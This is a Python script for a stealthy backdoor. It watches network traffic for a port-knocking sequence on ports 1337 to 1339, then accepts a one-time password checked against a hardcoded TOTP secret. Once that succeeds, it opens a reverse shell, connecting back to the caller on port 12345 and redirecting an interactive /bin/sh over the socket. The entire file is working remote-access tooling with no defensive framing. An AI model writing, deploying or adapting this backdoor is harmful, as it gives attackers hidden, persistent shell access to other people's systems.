from pypacker import psocket
from pypacker.layer12 import ethernet
from pypacker.layer4 import tcp
from time import time
import pyotp 
import socket 
import subprocess
import os
import sys


def port_knocking(ports, timeout):
  """Monitor connections on pre-configured ports. This function ends if the Port Knocking is completed."""

  my_socket = psocket.SocketHndl(iface_name=None, timeout=60)
  port_count = current_time = 0

  while (port_count < len(ports)):
    bts = my_socket.recv()                # receiving bytes
    pkt = ethernet.Ethernet(bts)          # getting the packet

    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[port_count]):
      if ((port_count != 0) and (time() - current_time > timeout)):   
        port_count = current_time = 0     # if the timeout is reached, restart
      else:
        port_count += 1                   # updating to the next port of the sequence
        current_time = time()             # updating the time to be calculated


def check_OTP(port_otp):
  """Open specific port to receive OTP password, if correct, return the remote user's ip to be used in the reverse shell."""

  otp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  otp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
  otp_socket.bind(('127.0.0.1', port_otp)) 
  otp_socket.listen(1) 
  con, client = otp_socket.accept()
  client_value = con.recv(8).decode().strip()    # receive OTP password
  otp_socket.close() 

  totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')          # OTP Secret Key
  if (totp.verify(client_value)):                
    return client[0] 
  sys.exit() 


def reverse_shell(client_ip, port_reverse_shell):
  """Send shell after successful port knocking and otp."""

  shell_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  shell_socket.connect((client_ip, port_reverse_shell))
  os.dup2(shell_socket.fileno(),0)
  os.dup2(shell_socket.fileno(),1) 
  os.dup2(shell_socket.fileno(),2)
  subprocess.call(["/bin/sh","-i"])
  shell_socket.close() 


if __name__ == '__main__':
  ports_list = [1337, 1338, 1339]   # ports for Port Knocking  
  timeout = 5                       # timeout between port connections during Port Knocking
  port_otp = 1340                   # port that will receive the OTP value
  port_reverse_shell = 12345        # port that will receive the reverse shell

  port_knocking(ports_list, timeout)
  client_ip = check_OTP(port_otp)
  reverse_shell(client_ip, port_reverse_shell)
